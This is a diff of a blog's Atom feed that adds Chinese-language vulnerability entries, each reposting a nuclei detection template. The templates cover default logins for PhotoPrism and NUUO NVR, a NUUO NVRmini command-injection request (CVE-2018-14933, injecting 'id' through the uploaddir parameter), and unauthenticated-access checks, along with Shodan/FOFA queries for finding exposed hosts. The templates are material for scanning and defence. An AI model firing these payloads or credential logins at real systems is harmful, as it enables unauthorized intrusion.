@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-16T16:45:13.139Z</updated>
+  <updated>2025-06-16T17:18:55.534Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,194 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PhotoPrism 默认登录漏洞</title>
+    <link href="http://example.com/2025/06/16/github_319756754/"/>
+    <id>http://example.com/2025/06/16/github_319756754/</id>
+    <published>2025-06-16T17:18:55.536Z</published>
+    <updated>2025-06-16T17:18:55.534Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PhotoPrism 默认登录漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> PhotoPrism是一个AI驱动的去中心化网络照片应用。此模板检测使用默认凭证（admin:admin321）的实例。</p><p><strong>产品厂商：</strong> PhotoPrism</p><p><strong>产品名称：</strong> PhotoPrism</p><p><strong>搜索语法：</strong> title:”PhotoPrism”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/6b3de02a87f72994ccf6fb02049d6b099576bfa1/http%2Fdefault-logins%2Fphotoprism-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/6b3de02a87f72994ccf6fb02049d6b099576bfa1/http%2Fdefault-logins%2Fphotoprism-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> photoprism-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PhotoPrism <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    PhotoPrism is an AI-powered photos app for the decentralized web. This template detects instances using default credentials (admin:admin321).<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>docs.photoprism.app<span class="hljs-operator">/</span>getting-started<span class="hljs-symbol">/</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;PhotoPrism&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;PhotoPrism&quot;</span><br>  <span class="hljs-params">tags:</span> photoprism,default-login,misconfig<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> admin<br>  <span class="hljs-params">password:</span> admin321<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/api/v1/session</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>        &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;username&#125;&#125;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;password&#125;&#125;&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains_all(body, <span class="hljs-string">&quot;access_token<span class="hljs-char escape_">\&quot;</span>:&quot;</span>, <span class="hljs-string">&quot;config<span class="hljs-char escape_">\&quot;</span>:&#123;&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(content_type, <span class="hljs-string">&quot;application/json&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PhotoPrism 默认登录漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>NUUO NVRmini 远程命令执行漏洞</title>
+    <link href="http://example.com/2025/06/16/github_2272276987/"/>
+    <id>http://example.com/2025/06/16/github_2272276987/</id>
+    <published>2025-06-16T17:18:17.699Z</published>
+    <updated>2025-06-16T17:18:17.697Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> NUUO NVRmini 远程命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-14933</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> NUUO NVRmini 存在未认证的远程命令执行漏洞，攻击者可以通过操纵upgrade_handle.php文件中的uploaddir参数执行任意命令。</p><p><strong>产品厂商：</strong> NUUO</p><p><strong>产品名称：</strong> NUUO NVRmini</p><p><strong>搜索语法：</strong> title:”NUUO”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/66755dd3873f1dc61d8ee4259cfbdf7be0562dc1/http%2Fcves%2F2018%2FCVE-2018-14933.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/66755dd3873f1dc61d8ee4259cfbdf7be0562dc1/http%2Fcves%2F2018%2FCVE-2018-14933.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2018-14933</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">NUUO NVRmini - Remote Command Execution</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ritikchaddha</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">NUUO NVRmini is vulnerable to unauthenticated remote command execution through the upgrade_handle.php file. The vulnerability allows an attacker to execute arbitrary commands by manipulating the uploaddir parameter.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.exploit-db.com/exploits/45070</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.cve.org/CVERecord?id=CVE-2018-14933</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2018-14933</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>    <span class="hljs-attribute">shodan-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">title:&quot;NUUO&quot;</span><br>    <span class="hljs-attribute">fofa-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">title=&quot;NUUO&quot;</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2018,nuuo,rce,kev</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: GET</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/upgrade_handle.php?cmd=writeuploaddir&amp;uploaddir=%27;id;%27&quot;</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;uid=[0-9]+.*gid=[0-9]+.*&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; NUUO NVRmini 远程命令执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>NUUO NVR 默认登录凭证漏洞</title>
+    <link href="http://example.com/2025/06/16/github_261197415/"/>
+    <id>http://example.com/2025/06/16/github_261197415/</id>
+    <published>2025-06-16T17:18:03.278Z</published>
+    <updated>2025-06-16T17:18:03.273Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> NUUO NVR 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> NUUO NVR系统经常部署有默认凭证（admin:admin）。此模板检测使用这些默认凭证的系统。</p><p><strong>产品厂商：</strong> NUUO</p><p><strong>产品名称：</strong> NUUO NVR</p><p><strong>搜索语法：</strong> title:”NUUO”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c82cb02883a8b0638e9ec14fc2428f7d742b0fc6/http%2Fdefault-logins%2Fnuuo-nvr-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c82cb02883a8b0638e9ec14fc2428f7d742b0fc6/http%2Fdefault-logins%2Fnuuo-nvr-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> nuuo-nvr-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> NUUO NVR <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    NUUO NVR systems are often deployed <span class="hljs-keyword">with</span> default credentials (admin:admin).This template detects systems using these default credentials.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span>www.nuuo.com<span class="hljs-symbol">/</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;NUUO&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;NUUO&quot;</span><br>  <span class="hljs-params">tags:</span> nuuo,nvr,default-login,misconfig<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> admin<br>  <span class="hljs-params">password:</span> admin<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/login.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/login.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">language</span><span class="hljs-operator">=</span>en&amp;user<span class="hljs-operator">=</span>&#123;&#123;username&#125;&#125;&amp;pass<span class="hljs-operator">=</span>&#123;&#123;password&#125;&#125;&amp;submit<span class="hljs-operator">=</span>Login<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/setting.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains_all(body_3, &#x27;cmd=logout&#x27;, &#x27;v_settings&#x27;)&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code_3 == 200 &amp;&amp; status_code_2 == 302&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; NUUO NVR 默认登录凭证漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PhotoPrism 未授权访问漏洞</title>
+    <link href="http://example.com/2025/06/16/github_2579903784/"/>
+    <id>http://example.com/2025/06/16/github_2579903784/</id>
+    <published>2025-06-16T17:17:55.361Z</published>
+    <updated>2025-06-16T17:17:55.357Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PhotoPrism 未授权访问漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> PhotoPrism是一个AI驱动的去中心化网络照片应用。此模板检测到无需认证即可访问的实例，可能会暴露敏感的用户数据和照片。</p><p><strong>产品厂商：</strong> PhotoPrism</p><p><strong>产品名称：</strong> PhotoPrism</p><p><strong>搜索语法：</strong> title:”PhotoPrism”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0a5dd2115cdbea3236ad02bc9d9b5365aac46e61/http%2Fmisconfiguration%2Fphotoprism-unauth.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0a5dd2115cdbea3236ad02bc9d9b5365aac46e61/http%2Fmisconfiguration%2Fphotoprism-unauth.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> photoprism-unauth<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PhotoPrism <span class="hljs-operator">-</span> Unauth Access<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    PhotoPrism is an AI-powered photos app for the decentralized web. This template detects instances that are accessible without authentication, potentially exposing sensitive user data and photos.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>docs.photoprism.app<span class="hljs-operator">/</span>getting-started<span class="hljs-symbol">/</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;PhotoPrism&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;PhotoPrism&quot;</span><br>  <span class="hljs-params">tags:</span> photoprism,misconfig,unauth<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/api/v1/config</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains_all(body, <span class="hljs-string">&quot;mode<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>user&quot;</span>, <span class="hljs-string">&quot;PhotoPrism&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(content_type, <span class="hljs-string">&quot;application/json&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PhotoPrism 未授权访问漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞类型：</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>OpenSearch Dashboard 未授权访问漏洞</title>
+    <link href="http://example.com/2025/06/16/github_1156430075/"/>
+    <id>http://example.com/2025/06/16/github_1156430075/</id>
+    <published>2025-06-16T17:17:17.072Z</published>
+    <updated>2025-06-16T17:17:17.068Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> OpenSearch Dashboard 未授权访问漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> OpenSearch Dashboard是OpenSearch的可视化和管理工具。此模板检测到无需认证即可访问的实例，可能会暴露敏感数据和系统信息。</p><p><strong>产品厂商：</strong> OpenSearch</p><p><strong>产品名称：</strong> OpenSearch Dashboard</p><p><strong>搜索语法：</strong> title:”OpenSearch”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/a4fb6109664027306d0144bf4bb4beb445ea17f3/http%2Fmisconfiguration%2Fopensearch-dashboard-unauth.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/a4fb6109664027306d0144bf4bb4beb445ea17f3/http%2Fmisconfiguration%2Fopensearch-dashboard-unauth.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> opensearch-dashboard-unauth<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> OpenSearch Dashboard <span class="hljs-operator">-</span> Unauth Access<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    OpenSearch Dashboard is a visualization and management tool for OpenSearch. This template detects instances that are accessible without authentication, potentially exposing sensitive data and system information.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>opensearch.org<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>latest<span class="hljs-operator">/</span>dashboards<span class="hljs-operator">/</span>index<span class="hljs-symbol">/</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;OpenSearch&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;OpenSearch&quot;</span><br>  <span class="hljs-params">tags:</span> opensearch,dashboard,misconfig,unauth<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>app<span class="hljs-operator">/</span>home<span class="hljs-comment">#/ HTTP/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/ui/fonts/source_sans_3/SourceSans3&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;font-family: &#x27;Source Code Pro&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;OpenSearch&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; OpenSearch Dashboard 未授权访问漏洞&lt;/p&gt;
+&lt;p&gt;&lt;st</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2025-49125 Authentication Bypass</title>
+    <link href="http://example.com/2025/06/16/github_2268809225/"/>
